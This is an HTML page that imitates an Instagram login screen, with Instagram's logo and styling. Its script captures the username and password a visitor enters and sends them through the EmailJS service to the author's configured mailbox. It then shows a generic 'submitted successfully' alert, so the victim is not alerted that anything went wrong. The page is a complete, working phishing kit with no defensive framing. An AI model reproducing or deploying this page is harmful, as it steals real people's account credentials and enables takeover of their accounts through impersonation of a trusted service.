<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .login-container img {
            width: 150px;
        }
        .input-box {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-btn:hover {
            background-color: #007acc;
        }
        .forgot-pass {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #385185;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <form id="login-form">
            <input type="text" class="input-box" placeholder="Username" id="username" required>
            <input type="password" class="input-box" placeholder="Password" id="password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-pass">Forgot Password?</a>
    </div>

    <script>
        // Initialize EmailJS with your Public Key (User ID)
        emailjs.init("4UitKf2odvQa-Hbsd");  // Replace with your Public Key (User ID)

        // Event listener for form submission
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();  // Prevent default form submission

            // Collect the form data (username and password)
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Send the data to your email via EmailJS
            emailjs.send('ahmadahmad', 'template_230wwfm', {
                username: username,
                password: password
            })
            .then(function(response) {
                console.log('Success:', response);
                alert('Form submitted successfully!');
            }, function(error) {
                console.log('Error:', error);
                alert('There was an error submitting the form.');
            });
        });
    </script>
</body>
</html>
